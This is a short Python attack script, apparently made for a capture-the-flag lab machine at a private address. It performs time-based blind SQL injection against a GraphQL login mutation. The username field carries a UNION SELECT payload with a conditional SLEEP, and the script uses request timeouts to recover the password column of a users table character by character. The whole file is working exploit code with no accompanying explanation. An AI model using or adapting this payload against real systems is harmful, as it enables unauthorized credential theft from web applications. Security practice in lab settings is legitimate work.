import requests, string, sys
import time
import json
URL = "http://10.129.255.46/graphql"

delay = 4


def query(pos, char, entry):
  # Entry is the no. row
  query = f"SUBSTRING((SELECT password FROM users LIMIT {entry},1), {pos}, 1) = '{char}'"
  return {
    "query": "mutation {LoginUser(username: \"' UNION SELECT 1, IF("+query+",SLEEP(6),1) #\", password: \"admin\"){message,token}}"
  }
  
#print(query(1, 1, 1))
chars = 'x0123456789' + string.ascii_letters + string.punctuation

print("Running!")

for e in range(0,100):
    for i in range(16, 100):
        found = False
        for c in chars:
            time.sleep(3)
            try:
                r = requests.post(
                  URL,
                  #data=json.dumps(query(i,c,e)),
                  json=query(i,c,e),
                  timeout=delay)
                #print(r.text)
                if e==0 and c == chars[-1] and i==1:
                    print(r.text)
                    exit()
            except requests.exceptions.Timeout:
                sys.stdout.write(c)
                sys.stdout.flush()
                found = True
                break
        if not found:
            break
    sys.stdout.write('\n')
 
print("\nDone! Try Harder!")
